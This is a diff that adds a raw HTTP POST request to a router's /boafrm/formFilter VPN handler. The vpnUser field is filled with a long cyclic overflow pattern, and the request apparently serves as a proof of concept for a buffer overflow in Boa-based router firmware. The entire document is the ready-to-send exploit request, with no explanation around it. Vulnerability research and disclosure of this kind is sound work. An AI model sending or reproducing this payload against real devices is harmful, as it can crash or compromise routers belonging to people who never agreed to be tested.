@@ -1,0 +1,31 @@
+POST /boafrm/formFilter HTTP/1.1
+
+Host: 192.168.0.1
+
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 715
+
+Origin: http://192.168.0.1
+
+DNT: 1
+
+Connection: close
+
+Referer: http://192.168.0.1/vpn.htm
+
+Cookie: webuicookie=1p4p24OHykTbddjR91Y87BPB
+
+Upgrade-Insecure-Requests: 1
+
+
+
+sessionCheck=82e9df78f02660b4b13c2a0d1130dc02&ip=172.16.3.2&enabled=1&encrypmppe=0&encrypipsec=0&ipsecpsk=&protocol=0&vpnUser=adminaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae&vpnPassword=passwd&ip3=3&ip4=2&comment=aaa&addFilterIps=Apply&submit-url=%2Fvpn.htm
